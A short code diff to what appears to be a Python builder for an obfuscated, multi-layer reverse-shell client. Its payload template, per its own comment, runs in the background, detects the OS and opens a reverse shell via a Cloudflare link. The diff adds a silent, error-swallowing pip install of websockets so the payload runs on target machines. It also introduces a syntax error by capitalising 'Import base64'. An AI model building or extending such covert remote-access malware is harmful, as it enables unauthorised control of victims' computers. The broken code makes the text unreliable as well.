@@ -1,4 +1,4 @@
-import base64
+Import base64
 import marshal
 import zlib
 
@@ -22,12 +22,29 @@ def buat_client_multi_layer(cf_link, xor_key=0x5A):
 
   cf_url = cf_url.rstrip("/")
 
-  # TEMPLATE PAYLOAD (Background, OS Detection, & Reverse Shell)
+  # TEMPLATE PAYLOAD (Auto-Install Websockets, Background, OS Detection, & Reverse Shell)
   template_kode = f"""
-import asyncio
-import websockets
 import os
 import sys
+import subprocess
+
+def install_dependencies():
+    try:
+        import websockets
+    except ImportError:
+        try:
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "websockets", "--quiet", "--no-warn-script-location"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        except Exception:
+            pass
+
+install_dependencies()
+
+import asyncio
+import websockets
 import platform
 import getpass
 
